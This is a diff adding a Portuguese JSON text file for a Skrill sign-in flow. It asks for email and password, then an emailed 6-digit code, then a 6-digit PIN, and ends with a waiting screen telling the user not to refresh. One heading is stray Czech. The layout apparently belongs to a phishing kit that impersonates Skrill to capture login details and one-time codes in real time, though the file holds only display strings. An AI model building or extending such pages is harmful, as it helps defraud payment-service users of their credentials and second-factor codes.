@@ -1,0 +1,48 @@
+{
+"main":{
+    "title":"Inicie a sessão na sua conta Skrill",
+    "dont":"Não tem uma conta? ",
+    "register":"Registro",
+    "email":"E-mail",
+    "pass":"Senha",
+    "button":"Entrar",
+    "forgot":"Esqueceu sua senha?"
+},
+
+"email":{
+    "auth":"Autenticação",
+    "step":"Etapa 1 de 2",
+    "title":"Zkontrolujte svůj e-mail",
+    "p1":"Um código de verificação de 6 dígitos foi enviado para",
+    "p2":" Digite-o abaixo.",
+    "label":"Código de verificação *",
+    "time1":"Seu código estará ativo por ",
+    "time2":"minutos.",
+    "code":"Enviar novo código",
+    "button":"CONTINUAR"
+},
+"pin":{
+    "step":"Etapa 2 de 2",
+    "title":"Digite seu PIN",
+    "p1":"Digite seu PIN de 6 dígitos para continuar o login. ",
+    "p2":"O que é isto?",
+    "forgot":"Não me perguntar de novo neste dispositivo.",
+    "button":"LOGIN",
+        "label":"PIN"
+         
+        
+},
+"wait":{
+    "title":"Autenticação...",
+    "desc":"Aguarde, estamos tentando conectar. Por favor, não atualize esta página. Pode levar alguns minutos."
+},
+"privace":{
+    
+    "privacy":"Política de Privacidade | Aviso de Cookies | Configurações de Cookies",
+
+    "p":"Skrill Limited. Registrada na Inglaterra e no País de Gales. Registro da empresa: 4260907. Matriz: 27th Floor, 25 Canada Square, Canary Wharf, Londres, E14 5LQ, Reino Unido. A Skrill Limited (FRN: 900001) é autorizada pela Financial Conduct Authority sob os Electronic Money Regulations de 2011 a emitir dinheiro eletrônico e instrumentos de pagamentos. Skrill é uma marca registrada de Skrill Limited."
+}
+}
+
+
+
